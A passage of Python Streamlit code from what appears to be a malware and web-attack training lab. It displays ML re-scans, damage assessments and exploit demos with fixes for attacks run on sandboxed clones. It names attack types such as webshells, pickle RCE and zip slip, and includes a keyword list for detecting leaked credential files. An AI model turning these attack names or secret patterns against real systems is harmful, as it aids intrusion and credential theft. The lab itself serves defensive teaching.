            'BODMAS · UNSW-NB15 &mdash; all real-world malware datasets. '
            'No synthetic data, no bias toward your test inputs.'
            '</div>'
            + _cmp_html
        )
        # Button row — scan benign baseline so user sees ML returning low score
        if not state.get(_cmp_key):
            _bc1, _bc2 = st.columns([1.5, 4])
            with _bc1:
                if st.button("🟢 Scan clean file",
                              key=f"clean_bl_{sample_key}",
                              use_container_width=True,
                              help="Runs the same ML on a known-benign system file. "
                                    "Score should be MUCH lower than this attack's."):
                    _do_clean_baseline_scan(sample_key, result, state)
                    st.rerun()
            with _bc2:
                st.markdown(
                    '<div style="padding-top:8px;font-family:Inter,sans-serif;'
                    'font-size:0.66rem;color:#64748B">'
                    'Proves the ML isn\'t just flagging everything — same code path, '
                    'benign file → low score.</div>', unsafe_allow_html=True,
                )


def _do_clean_baseline_scan(sample_key: str, result: dict, state: dict) -> None:
    """Scan a known-clean file using docker exec → host ML for comparison."""
    clone_id = result.get("clone_id", "")
    # Pick a benign system file inside the clone
    candidates = ["/etc/hostname", "/etc/os-release", "/etc/issue",
                   "/etc/mime.types", "/etc/timezone"]
    try:
        import docker as _dk, tempfile, os as _os
        _c = _dk.from_env(timeout=4)
        _ct = None
        for _n in (f"aidtctm_{clone_id}", f"aidtctm_clone_{clone_id}", clone_id):
            try:
                _ct = _c.containers.get(_n)
                break
            except Exception:
                continue
        if _ct is None:
            st.toast("Container not reachable for baseline scan", icon="⚠")
            return
        # Find a present candidate + read its bytes
        picked = None
        body = b""
        for f in candidates:
            res = _ct.exec_run(["sh", "-c", f"test -f {f} && cat {f}"])
            out = (res.output or b"").decode("utf-8", "replace")
            if res.exit_code == 0 and out.strip():
                picked = f
                body = (res.output or b"")
                break
        if picked is None:
            st.toast("No clean candidate file found in container", icon="⚠")
            return
        # Run ML on it
        from core.malware_ml import analyse_file
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix="_clean.txt")
        tmp.write(body)
        tmp.close()
        res = analyse_file(tmp.name)
        try: _os.unlink(tmp.name)
        except Exception: pass
        state[f"_ml_clean_baseline_{sample_key}"] = {
            "target": picked,
            "label":  res.get("label", "?"),
            "prob":   res.get("malicious_prob", 0) * 100,
            "risk":   res.get("risk_score", 0),
        }
        st.toast(f"✓ Clean baseline: {picked} → {res.get('label','?').upper()}", icon="🟢")
    except Exception as e:
        st.toast(f"Baseline scan failed: {e}", icon="⚠")


def _run_ml_rescan(sample_key: str, result: dict, state: dict) -> None:
    """v30: actually wire 🧠 Re-scan ML — run analyse_file on the dropped
       artifact and persist the result for side-by-side display."""
    from core.live_malware_lab import SAMPLES, _materialise_sample_content
    import tempfile, os as _os
    sample = SAMPLES.get(sample_key, {})
    if not sample:
        st.toast(f"Unknown sample: {sample_key}", icon="⚠")
        return
    content = _materialise_sample_content(sample_key, sample.get("content"))
    if isinstance(content, dict):
        # YARA multi-file — concatenate to a single scan target
        combined = "\n\n# === fixture sep ===\n\n".join(
            v if isinstance(v, str) else v.decode("utf-8", "replace")
            for v in content.values()
        )
        content = combined
    with st.status(f"🧠 Re-scanning {sample.get('label', sample_key)}…",
                    expanded=True) as _st:
        try:
            from core.malware_ml import analyse_file
            suffix = "_" + sample.get("filename", "scan.bin")
            tmp = tempfile.NamedTemporaryFile(delete=False, suffix=suffix)
            if isinstance(content, (bytes, bytearray)):
                tmp.write(bytes(content))
            else:
                tmp.write(str(content).encode("utf-8"))
            tmp.close()
            res = analyse_file(tmp.name)
            try: _os.unlink(tmp.name)
            except Exception: pass

            # Pull original score from the attack log's DETECT phase
            _orig = None
            for ev in state.get(f"lab_log_{sample_key}", []):
                if ev.get("phase") == "detect" and "MalwareML" in (ev.get("text") or ""):
                    _orig = ev.get("text", "")
                    break
            state[f"_rescan_result_{sample_key}"] = {
                "label":       res.get("label", "?"),
                "prob":        res.get("malicious_prob", 0) * 100,
                "risk":        res.get("risk_score", 0),
                "family":      (res.get("family") or {}).get("name", "?")
                                if isinstance(res.get("family"), dict)
                                else str(res.get("family", "?")),
                "sha256":      res.get("sha256", ""),
                "top_signals": (res.get("top_signals") or [])[:4],
                "original":    _orig,
                "size":        len(content) if hasattr(content, "__len__") else 0,
            }
            _st.update(label=f"✓ Re-scan complete — {res.get('label','?').upper()} "
                              f"{res.get('malicious_prob', 0)*100:.0f}%",
                        state="complete", expanded=False)
        except Exception as e:
            state[f"_rescan_result_{sample_key}"] = {
                "label": "error", "prob": 0, "risk": 0,
                "family": "?", "sha256": "", "top_signals": [],
                "error": str(e), "size": 0,
            }
            _st.update(label=f"✗ Re-scan failed: {e}", state="error",
                        expanded=True)


def _render_rescan_card(rs: dict, sample_key: str) -> None:
    """Render the persisted re-scan result inline under the Next-Step bar."""
    if rs.get("error"):
        st.html(
            f'<div style="background:#FEF2F2;border:1.5px solid #FCA5A5;'
            f'border-left:4px solid #DC2626;border-radius:9px;padding:10px 14px;'
            f'margin-top:8px">'
            f'<div style="font-family:Inter,sans-serif;font-size:0.74rem;'
            f'font-weight:700;color:#991B1B;letter-spacing:0.02em">'
            f'🧠 RE-SCAN ML &middot; failed</div>'
            f'<div style="font-family:JetBrains Mono,monospace;font-size:0.66rem;'
            f'color:#7F1D1D;margin-top:4px">{rs["error"]}</div></div>'
        )
        return
    _crit = (rs["label"] or "").lower() == "malicious"
    _accent = "#DC2626" if _crit else "#16A34A"
    _bg = "#FEF2F2" if _crit else "#F0FDF4"
    _badge_emoji = "🔴" if _crit else "🟢"
    st.html(
        f'<div style="background:{_bg};border:1.5px solid {_accent}55;'
        f'border-left:4px solid {_accent};border-radius:9px;padding:11px 14px;'
        f'margin-top:8px;box-shadow:0 2px 8px -3px {_accent}33">'
        # Header
        f'<div style="display:flex;align-items:center;justify-content:space-between;'
        f'gap:10px;margin-bottom:7px">'
        f'<div style="font-family:Inter,sans-serif;font-size:0.78rem;font-weight:700;'
        f'color:{_accent};letter-spacing:0.02em">'
        f'🧠 FRESH ML RE-SCAN &middot; {sample_key}</div>'
        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.6rem;font-weight:700;'
        f'color:{_accent};background:#FFFFFF;border:1px solid {_accent}66;'
        f'border-radius:6px;padding:2px 9px">{_badge_emoji} {rs["label"].upper()}</span>'
        f'</div>'
        # Side-by-side KPIs
        f'<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:7px">'
        f'<div style="background:#FFFFFF;border:1px solid #E2E8F0;border-radius:6px;'
        f'padding:7px 9px;text-align:center">'
        f'<div style="font-family:Space Grotesk,sans-serif;font-size:1.15rem;'
        f'font-weight:800;color:{_accent};line-height:1">{rs["prob"]:.0f}%</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
        f'color:#64748B;letter-spacing:0.1em;margin-top:2px">MALICIOUS</div></div>'
        f'<div style="background:#FFFFFF;border:1px solid #E2E8F0;border-radius:6px;'
        f'padding:7px 9px;text-align:center">'
        f'<div style="font-family:Space Grotesk,sans-serif;font-size:1.15rem;'
        f'font-weight:800;color:{_accent};line-height:1">{rs["risk"]}/100</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
        f'color:#64748B;letter-spacing:0.1em;margin-top:2px">RISK</div></div>'
        f'<div style="background:#FFFFFF;border:1px solid #E2E8F0;border-radius:6px;'
        f'padding:7px 9px;text-align:center">'
        f'<div style="font-family:Inter,sans-serif;font-size:0.7rem;font-weight:700;'
        f'color:#0F172A;line-height:1.1;margin-top:3px">{rs["family"][:18]}</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
        f'color:#64748B;letter-spacing:0.1em;margin-top:2px">FAMILY</div></div>'
        f'<div style="background:#FFFFFF;border:1px solid #E2E8F0;border-radius:6px;'
        f'padding:7px 9px;text-align:center">'
        f'<div style="font-family:Space Grotesk,sans-serif;font-size:1.1rem;'
        f'font-weight:800;color:#475569;line-height:1">{rs["size"]}</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
        f'color:#64748B;letter-spacing:0.1em;margin-top:2px">BYTES</div></div>'
        f'</div>'
        # SHA + signals
        + (
            f'<div style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
            f'color:#64748B;margin-top:7px;word-break:break-all">'
            f'sha256: <span style="color:#0F172A">{rs["sha256"][:32]}…</span>'
            f'</div>' if rs.get("sha256") else ""
        )
        + (
            '<div style="margin-top:5px">' + "".join(
                f'<div style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
                f'color:#475569;padding:2px 0">▸ signal: '
                f'<b style="color:#0F172A">{str(sig)[:80]}</b></div>'
                for sig in rs["top_signals"]
            ) + '</div>' if rs["top_signals"] else ""
        )
        # Comparison vs original
        + (
            f'<div style="background:#F1F5F9;border:1px solid #CBD5E1;border-radius:5px;'
            f'padding:5px 9px;margin-top:7px;'
            f'font-family:JetBrains Mono,monospace;font-size:0.58rem;color:#475569;'
            f'word-break:break-word">'
            f'<b style="color:#0F172A">Original scan:</b> {rs["original"][:160]}'
            f'</div>' if rs.get("original") else ""
        )
        + '</div>'
    )


def _pick_next_recommended(current_key: str, state: dict) -> str | None:
    """Pick the next attack the user hasn't run yet."""
    from core.live_malware_lab import SAMPLES as _LM_SAMPLES
    # Use the same recommendation map shape; default order if no profile
    fallback_order = [
        "eicar", "php_webshell", "path_traversal", "header_injection",
        "file_upload_exploit", "pickle_rce", "pe_anomaly", "macro_doc",
        "gtube", "lolbin", "yara_test", "zip_slip", "pdf_js", "php_dropper",
    ]
    for k in fallback_order:
        if k == current_key:
            continue
        if k not in _LM_SAMPLES:
            continue
        if not state.get(f"lab_log_{k}"):
            return k
    return None


def _render_damage_assessment(log: list, label: str, sample_key: str,
                                clone_id: str) -> None:
    """
    After-attack visual proof — shows on the same page that the clone was
    actually impacted: counters, evidence chips, side-by-side BEFORE → AFTER.
    """
    if not log:
        return

    # Aggregate signals from the event log
    crits  = sum(1 for e in log if e.get("status") == "crit")
    oks    = sum(1 for e in log if e.get("status") == "ok")
    total  = len(log)

    inject_evts = [e for e in log if e.get("phase") == "inject" and e.get("status") == "ok"]
    post_evts   = [e for e in log if e.get("phase") == "post"]
    react_evts  = [e for e in log if e.get("phase") == "react"]

    # Files actually written to the clone
    files = []
    for e in inject_evts:
        det = (e.get("detail") or "")
        for ln in det.splitlines():
            ln = ln.strip(" •-→›>\t")
            if ln.startswith("/") and len(ln) < 200:
                files.append(ln)
    files = list(dict.fromkeys(files))

    # Leaked content excerpts from post phase (real leaked secrets/data)
    leaked_chunks = []
    for e in post_evts:
        det = (e.get("detail") or "")[:600]
        if det.strip():
            leaked_chunks.append((e.get("phase_label") or "POST", det))

    # Counters
    secrets_count = 0
    for _, det in leaked_chunks:
        l = det.lower()
        for kw in ("password", "secret", "api_key", "token", "private_key",
                    "aws_access", "passwd:", "root:x:", "shadow"):
            if kw in l:
                secrets_count += 1
                break

    compromised = crits > 0 or len(files) > 0 or secrets_count > 0
    verdict_color = "#DC2626" if compromised else "#16A34A"
    verdict_bg    = "#FEF2F2" if compromised else "#F0FDF4"
    verdict_label = "🔴 CLONE COMPROMISED" if compromised else "🟢 CLONE RESILIENT"

    # ── Big damage banner ──
    st.markdown(
        f'<div style="background:{verdict_bg};border:2px solid {verdict_color}55;'
        f'border-left:5px solid {verdict_color};border-radius:10px;'
        f'padding:12px 16px;margin:14px 0 10px;'
        f'display:flex;align-items:center;justify-content:space-between;gap:14px;'
        f'box-shadow:0 4px 14px -6px {verdict_color}33">'
        f'<div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.62rem;'
        f'font-weight:700;color:{verdict_color};letter-spacing:0.16em">'
        f'DAMAGE ASSESSMENT</div>'
        f'<div style="font-family:Inter,sans-serif;font-size:1.05rem;font-weight:800;'
        f'color:{verdict_color};margin-top:2px">{verdict_label}</div>'
        f'</div>'
        # KPI chips
        f'<div style="display:flex;gap:8px">'
        f'<div style="background:#FFFFFF;border:1px solid #FECACA;border-radius:8px;'
        f'padding:7px 12px;text-align:center;min-width:64px">'
        f'<div style="font-family:Space Grotesk,sans-serif;font-size:1.2rem;'
        f'font-weight:800;color:#DC2626;line-height:1">{crits}</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
        f'color:#7F1D1D;letter-spacing:0.1em;margin-top:2px">CRITICAL</div></div>'
        f'<div style="background:#FFFFFF;border:1px solid #FDE68A;border-radius:8px;'
        f'padding:7px 12px;text-align:center;min-width:64px">'
        f'<div style="font-family:Space Grotesk,sans-serif;font-size:1.2rem;'
        f'font-weight:800;color:#B45309;line-height:1">{len(files)}</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
        f'color:#92400E;letter-spacing:0.1em;margin-top:2px">FILES IN</div></div>'
        f'<div style="background:#FFFFFF;border:1px solid #FCA5A5;border-radius:8px;'
        f'padding:7px 12px;text-align:center;min-width:64px">'
        f'<div style="font-family:Space Grotesk,sans-serif;font-size:1.2rem;'
        f'font-weight:800;color:#DC2626;line-height:1">{secrets_count}</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
        f'color:#7F1D1D;letter-spacing:0.1em;margin-top:2px">LEAKED</div></div>'
        f'<div style="background:#FFFFFF;border:1px solid #E2E8F0;border-radius:8px;'
        f'padding:7px 12px;text-align:center;min-width:64px">'
        f'<div style="font-family:Space Grotesk,sans-serif;font-size:1.2rem;'
        f'font-weight:800;color:#475569;line-height:1">{total}</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
        f'color:#64748B;letter-spacing:0.1em;margin-top:2px">EVENTS</div></div>'
        f'</div>'
        f'</div>',
        unsafe_allow_html=True,
    )

    if not compromised:
        return

    # ── Side-by-side BEFORE → AFTER ──
    files_html = ""
    if files:
        for f in files[:8]:
            files_html += (
                f'<div style="background:#FFFFFF;border:1px solid #FECACA;'
                f'border-left:3px solid #DC2626;border-radius:5px;'
                f'padding:5px 9px;margin-bottom:4px;'
                f'font-family:JetBrains Mono,monospace;font-size:0.66rem;'
                f'color:#7F1D1D;word-break:break-all">'
                f'<span style="color:#16A34A">+</span> {f}</div>'
            )
    else:
        files_html = (
            '<div style="font-family:Inter,sans-serif;font-size:0.72rem;'
            'color:#64748B;font-style:italic;padding:8px">'
            'No new files (payload was probed, not written)</div>'
        )

    leak_html = ""
    if leaked_chunks:
        for ph, det in leaked_chunks[:3]:
            preview = det.replace("<", "&lt;").replace(">", "&gt;")[:400]
            leak_html += (
                f'<div style="background:#000000;border:1px solid #14532D;'
                f'border-left:3px solid #39FF14;border-radius:5px;'
                f'padding:7px 10px;margin-bottom:4px;'
                f'font-family:JetBrains Mono,monospace;font-size:0.62rem;'
                f'color:#A7F3D0;line-height:1.5;white-space:pre-wrap;'
                f'overflow:auto;max-height:140px">{preview}</div>'
            )
    else:
        leak_html = (
            '<div style="font-family:Inter,sans-serif;font-size:0.72rem;'
            'color:#64748B;font-style:italic;padding:8px">'
            'No data leaked back to attacker</div>'
        )

    st.markdown(
        '<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:0 0 14px">'
        # LEFT: files written to clone (= attack landed)
        '<div style="background:#FEF2F2;border:1px solid #FECACA;border-radius:9px;'
        'padding:10px 12px">'
        '<div style="display:flex;align-items:center;gap:6px;margin-bottom:6px">'
        '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#DC2626" '
        'stroke-width="2" stroke-linecap="round" stroke-linejoin="round">'
        '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>'
        '<polyline points="14 2 14 8 20 8"/></svg>'
        '<span style="font-family:Inter,sans-serif;font-size:0.78rem;font-weight:700;'
        'color:#7F1D1D">Files written to clone</span>'
        '<span style="margin-left:auto;font-family:JetBrains Mono,monospace;'
        'font-size:0.58rem;font-weight:700;color:#DC2626;background:#FFFFFF;'
        'border:1px solid #FECACA;padding:2px 6px;border-radius:4px">'
        f'{len(files)} CHANGES</span>'
        '</div>' + files_html + '</div>'
        # RIGHT: data leaked back from clone (= attacker won)
        '<div style="background:#0A0A0A;border:1px solid #14532D;border-radius:9px;'
        'padding:10px 12px">'
        '<div style="display:flex;align-items:center;gap:6px;margin-bottom:6px">'
        '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#39FF14" '
        'stroke-width="2" stroke-linecap="round" stroke-linejoin="round">'
        '<path d="M4 17l6-6-6-6"/><path d="M12 19h8"/></svg>'
        '<span style="font-family:Inter,sans-serif;font-size:0.78rem;font-weight:700;'
        'color:#39FF14">Data leaked back to attacker</span>'
        '<span style="margin-left:auto;font-family:JetBrains Mono,monospace;'
        'font-size:0.58rem;font-weight:700;color:#39FF14;background:#000000;'
        'border:1px solid #14532D;padding:2px 6px;border-radius:4px">'
        f'{len(leaked_chunks)} CHUNKS</span>'
        '</div>' + leak_html + '</div>'
        '</div>',
        unsafe_allow_html=True,
    )


# ═════════════════════════════════════════════════════════════════════
# 🎯 EXPLOIT DEMO — the senior-engineer answer to "why does this matter"
# ═════════════════════════════════════════════════════════════════════
def _render_exploit_demo(log: list, sample_key: str, result: dict) -> None:
    """
    After every attack, show a 3-panel educational artefact:

       1. 🎯 LIVE PROOF  — clickable attacker URL + screenshot of the exploit
       2. 🩺 ROOT CAUSE  — exact source lines that allowed the attack
       3. 🛠 MITIGATE    — copy-paste patch to fix it
    """
    import html as _h
    from core.source_clone import SANDBOX_ROOT

    clone_id = result.get("clone_id", "")
    sandbox  = SANDBOX_ROOT / clone_id if clone_id else None

    try:
        from core.exploit_demo import build_demo
        demo = build_demo(sample_key, log, result, sandbox=sandbox)
    except Exception as e:
        st.warning(f"Exploit demo build failed: {e}")
        return

    proof    = demo.get("proof", {})
    diag     = demo.get("diagnose", {})
    mitig    = demo.get("mitigate", {})
    succeeded = proof.get("success", False)

    # ── Section header ──
    border_col = "#DC2626" if succeeded else "#16A34A"
    head_bg    = "#FEF2F2" if succeeded else "#F0FDF4"
    head_label = ("🔴 EXPLOIT SUCCEEDED — see proof, root cause, and fix"
                   if succeeded else
                   "🟢 EXPLOIT BLOCKED — still here's how the attack would have worked")
    head_color = "#7F1D1D" if succeeded else "#14532D"

    st.markdown(
        f'<div style="background:{head_bg};border:1px solid {border_col}44;'
        f'border-left:4px solid {border_col};border-radius:10px;'
        f'padding:11px 16px;margin:16px 0 8px;'
        f'display:flex;align-items:center;justify-content:space-between">'
        f'<div style="display:flex;align-items:center;gap:9px">'
        f'<svg width="18" height="18" viewBox="0 0 24 24" fill="none" '
        f'stroke="{border_col}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">'
        f'<circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3"/>'
        f'<line x1="12" y1="2" x2="12" y2="5"/><line x1="12" y1="19" x2="12" y2="22"/>'
        f'<line x1="2" y1="12" x2="5" y2="12"/><line x1="19" y1="12" x2="22" y2="12"/></svg>'
        f'<div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
        f'font-weight:700;color:{head_color};letter-spacing:0.14em">EXPLOIT DEMO</div>'
        f'<div style="font-family:Inter,sans-serif;font-size:0.95rem;font-weight:700;'
        f'color:{head_color}">{head_label}</div>'
        f'</div></div>'
        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
        f'font-weight:700;color:#475569;background:#FFFFFF;border:1px solid #E2E8F0;'
        f'padding:3px 9px;border-radius:5px;letter-spacing:0.06em">'
        f'PROOF · ROOT CAUSE · FIX</span>'
        f'</div>',
        unsafe_allow_html=True,
    )

    # ════════════════════════════════════════════════════════════════
    # PANEL 1 · LIVE PROOF
    # ════════════════════════════════════════════════════════════════
    proof_url    = proof.get("url", "")
    proof_url_s  = _h.escape(proof_url)
    proof_title  = _h.escape(proof.get("title", ""))
    proof_body   = _h.escape(proof.get("body", ""))
    proof_story  = _h.escape(proof.get("narrative", ""))
    proof_realw  = _h.escape(proof.get("real_world", ""))

    st.markdown(
        '<div style="font-family:Inter,sans-serif;font-size:0.82rem;font-weight:700;'
        'color:#0F172A;margin:6px 0 6px;display:flex;align-items:center;gap:7px">'
        '<span style="background:#DC2626;color:#FFF;border-radius:50%;width:18px;'
        'height:18px;display:inline-flex;align-items:center;justify-content:center;'
        'font-size:0.66rem;font-weight:800">1</span>'
        '🎯 Live proof — what the attacker sees right now'
        '</div>',
        unsafe_allow_html=True,
    )

    # Big card with URL + simulated browser preview
    st.markdown(
        f'<div style="background:#FFFFFF;border:1px solid #E2E8F0;border-radius:10px;'
        f'overflow:hidden;margin-bottom:14px">'
        # Browser-style URL bar
        f'<div style="background:#F8FAFC;border-bottom:1px solid #E2E8F0;'
        f'padding:8px 12px;display:flex;align-items:center;gap:8px">'
        f'<span style="width:9px;height:9px;border-radius:50%;background:#EF4444"></span>'
        f'<span style="width:9px;height:9px;border-radius:50%;background:#F59E0B"></span>'
        f'<span style="width:9px;height:9px;border-radius:50%;background:#22C55E"></span>'
        f'<code style="flex:1;margin-left:8px;font-family:JetBrains Mono,monospace;'
        f'font-size:0.72rem;background:#FFFFFF;border:1px solid #CBD5E1;'
        f'border-radius:5px;padding:4px 10px;color:#1E40AF;word-break:break-all">'
        f'⚠ Not secure  ·  {proof_url_s}</code>'
        f'<a href="{proof_url_s}" target="_blank" '
        f'style="background:#DC2626;color:#FFF;text-decoration:none;'
        f'font-family:JetBrains Mono,monospace;font-size:0.66rem;font-weight:700;'
        f'padding:5px 12px;border-radius:5px;letter-spacing:0.04em">'
        f'OPEN ↗</a>'
        f'</div>'
        # Body: simulated browser content
        f'<div style="padding:14px 18px">'
        f'<div style="font-family:Inter,sans-serif;font-size:0.85rem;font-weight:700;'
        f'color:#7F1D1D;margin-bottom:6px">{proof_title}</div>'
        f'<pre style="background:#1F2937;color:#39FF14;padding:10px 14px;'
        f'border-radius:6px;font-family:JetBrains Mono,monospace;font-size:0.74rem;'
        f'margin:0;line-height:1.55;white-space:pre-wrap;word-break:break-word;'
        f'max-height:160px;overflow:auto">{proof_body}</pre>'
        f'<div style="font-family:Inter,sans-serif;font-size:0.76rem;'
        f'color:#475569;line-height:1.6;margin-top:10px">{proof_story}</div>'
        + (f'<div style="background:#FEF3C7;border:1px solid #FDE68A;'
            f'border-left:3px solid #D97706;border-radius:6px;padding:8px 12px;'
            f'margin-top:10px;font-family:Inter,sans-serif;font-size:0.74rem;'
            f'color:#92400E"><b>🌍 Real-world impact:</b> {proof_realw}</div>'
            if proof_realw else "")
        + '</div></div>',
        unsafe_allow_html=True,
    )

    # ════════════════════════════════════════════════════════════════
    # PANEL 2 · ROOT CAUSE
    # ════════════════════════════════════════════════════════════════
    st.markdown(
        '<div style="font-family:Inter,sans-serif;font-size:0.82rem;font-weight:700;'
        'color:#0F172A;margin:6px 0 6px;display:flex;align-items:center;gap:7px">'
        '<span style="background:#F59E0B;color:#FFF;border-radius:50%;width:18px;'
        'height:18px;display:inline-flex;align-items:center;justify-content:center;'
        'font-size:0.66rem;font-weight:800">2</span>'
        '🩺 Root cause — exactly which lines of your code allowed it'
        '</div>',
        unsafe_allow_html=True,
    )

    vuln_files  = diag.get("vulnerable_files", [])
    root_cause  = _h.escape(diag.get("root_cause", ""))
    cwe_chips   = "".join(
        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.62rem;'
        f'font-weight:700;color:#9333EA;background:#FAF5FF;border:1px solid #E9D5FF;'
        f'border-radius:5px;padding:3px 8px;margin-right:4px">{_h.escape(c)}</span>'
        for c in diag.get("cwe", [])
    )
    owasp = diag.get("owasp", "")
    owasp_chip = (
        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.62rem;'
        f'font-weight:700;color:#1E40AF;background:#EFF6FF;border:1px solid #BFDBFE;'
        f'border-radius:5px;padding:3px 8px;margin-right:4px">'
        f'🛡 {_h.escape(owasp)}</span>'
        if owasp else ""
    )

    # Vulnerable file cards
    files_html = ""
    if vuln_files:
        for vf in vuln_files[:5]:
            f_path = _h.escape(vf.get("file", "?"))
            f_line = vf.get("line", 0)
            f_code = _h.escape(vf.get("code", ""))
            f_why  = _h.escape(vf.get("why", ""))
            files_html += (
                f'<div style="background:#FFFFFF;border:1px solid #E2E8F0;'
                f'border-left:3px solid #DC2626;border-radius:7px;padding:9px 12px;'
                f'margin-bottom:6px">'
                f'<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">'
                f'<svg width="12" height="12" viewBox="0 0 24 24" fill="none" '
                f'stroke="#DC2626" stroke-width="2"><polyline points="16 18 22 12 16 6"/>'
                f'<polyline points="8 6 2 12 8 18"/></svg>'
                f'<code style="font-family:JetBrains Mono,monospace;font-size:0.7rem;'
                f'color:#1E40AF;font-weight:700">{f_path}</code>'
                f'<span style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
                f'color:#7F1D1D;background:#FEF2F2;border:1px solid #FECACA;'
                f'border-radius:4px;padding:1px 7px;font-weight:700">line {f_line}</span>'
                f'</div>'
                f'<pre style="margin:6px 0 4px;background:#1F2937;color:#FBBF24;'
                f'padding:7px 11px;border-radius:5px;font-family:JetBrains Mono,monospace;'
                f'font-size:0.72rem;line-height:1.5;white-space:pre-wrap;'
                f'word-break:break-word">{f_code}</pre>'
                f'<div style="font-family:Inter,sans-serif;font-size:0.72rem;'
                f'color:#7F1D1D;font-weight:500;line-height:1.5">▸ {f_why}</div>'
                f'</div>'
            )
    else:
        files_html = (
            '<div style="background:#FFFBEB;border:1px solid #FDE68A;border-radius:7px;'
            'padding:10px 12px;font-family:Inter,sans-serif;font-size:0.74rem;'
            'color:#92400E">'
            'ℹ Could not localize the exact vulnerable line in this codebase. '
            'The root cause below describes the pattern at runtime.'
            '</div>'
        )

    st.markdown(
        f'<div style="background:#FFFBEB;border:1px solid #FDE68A;border-radius:10px;'
        f'padding:12px 14px;margin-bottom:14px">'
        # Top: root cause summary + CWE chips
        f'<div style="font-family:Inter,sans-serif;font-size:0.78rem;font-weight:600;'
        f'color:#92400E;line-height:1.6;margin-bottom:8px">'
        f'<b style="color:#7C2D12">Why this attack worked:</b> {root_cause}'
        f'</div>'
        + (f'<div style="margin-bottom:9px">{cwe_chips}{owasp_chip}</div>'
            if (cwe_chips or owasp_chip) else "")
        # Vulnerable file list
        + files_html
        + '</div>',
        unsafe_allow_html=True,
    )

    # ════════════════════════════════════════════════════════════════
    # PANEL 3 · MITIGATION
    # ════════════════════════════════════════════════════════════════
    st.markdown(
        '<div style="font-family:Inter,sans-serif;font-size:0.82rem;font-weight:700;'
        'color:#0F172A;margin:6px 0 6px;display:flex;align-items:center;gap:7px">'
        '<span style="background:#16A34A;color:#FFF;border-radius:50%;width:18px;'
        'height:18px;display:inline-flex;align-items:center;justify-content:center;'
        'font-size:0.66rem;font-weight:800">3</span>'
        '🛠 How to fix — copy this patch into your code'
        '</div>',
        unsafe_allow_html=True,
    )

    mtitle = _h.escape(mitig.get("title", ""))
    mwhy   = _h.escape(mitig.get("why", ""))
    mpatch = mitig.get("patch", "")
    mlibs  = mitig.get("libs", []) or []
    mfwk   = _h.escape(mitig.get("framework", "unknown"))

    libs_html = ""
    if mlibs:
        items = "".join(f'<li style="margin-bottom:3px">{_h.escape(l)}</li>'
                          for l in mlibs)
        libs_html = (
            '<div style="margin-top:10px;padding-top:8px;'
            'border-top:1px dashed #BBF7D0">'
            '<div style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
            'font-weight:700;color:#15803D;letter-spacing:0.12em;'
            'margin-bottom:4px">PRODUCTION-GRADE LIBRARIES</div>'
            f'<ul style="margin:0;padding-left:18px;font-family:Inter,sans-serif;'
            f'font-size:0.72rem;color:#166534;line-height:1.6">{items}</ul></div>'
        )

    st.markdown(
        f'<div style="background:#F0FDF4;border:1px solid #BBF7D0;border-radius:10px;'
        f'padding:12px 14px;margin-bottom:14px">'
        f'<div style="font-family:Inter,sans-serif;font-size:0.84rem;font-weight:700;'
        f'color:#14532D;margin-bottom:6px;display:flex;align-items:center;gap:8px">'
        f'<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#16A34A" '
        f'stroke-width="2"><path d="M9 12l2 2 4-4"/><circle cx="12" cy="12" r="10"/></svg>'
        f'{mtitle}'
        f'<span style="margin-left:auto;font-family:JetBrains Mono,monospace;'
        f'font-size:0.58rem;font-weight:700;color:#15803D;background:#FFFFFF;'
        f'border:1px solid #BBF7D0;padding:2px 8px;border-radius:4px">'
        f'FRAMEWORK · {mfwk.upper()}</span>'
        f'</div>'
        f'<div style="font-family:Inter,sans-serif;font-size:0.76rem;color:#166534;'
        f'line-height:1.6;margin-bottom:10px">{mwhy}</div>'
        f'</div>',
        unsafe_allow_html=True,
    )

    # Code block — use st.code so user gets the native copy button
    if mpatch:
        lang = "php" if "php" in mfwk else ("python" if mfwk in ("python","py")
                  else ("javascript" if mfwk in ("node","nodejs","js","javascript","typescript")
                          else "php"))
        st.code(mpatch, language=lang)
        if libs_html:
            st.markdown(libs_html, unsafe_allow_html=True)

    # Closing summary
    st.markdown(
        '<div style="background:linear-gradient(135deg,#EFF6FF,#FAF5FF);'
        'border:1px dashed #BFDBFE;border-radius:8px;padding:9px 14px;'
        'margin-top:6px;font-family:Inter,sans-serif;font-size:0.72rem;'
        'color:#1E40AF;line-height:1.55">'
        '🎓 <b>Closed loop:</b> after applying this patch to your source, '
        're-deploy the clone and run the same attack again from above — '
        'a successful fix means the attack now fails. That is your '
        '<b>verification</b> step.'
        '</div>',
        unsafe_allow_html=True,
    )


# ─────────────────────────────────────────────────────────────────────
#  ML MALWARE ANALYSIS  (shown after EICAR injection or on demand)
# ─────────────────────────────────────────────────────────────────────
def _render_ml_analysis(state: dict, result: dict) -> None:
    """
    ML-based malware analysis panel.
    Runs on demand or auto-shows after EICAR injection.
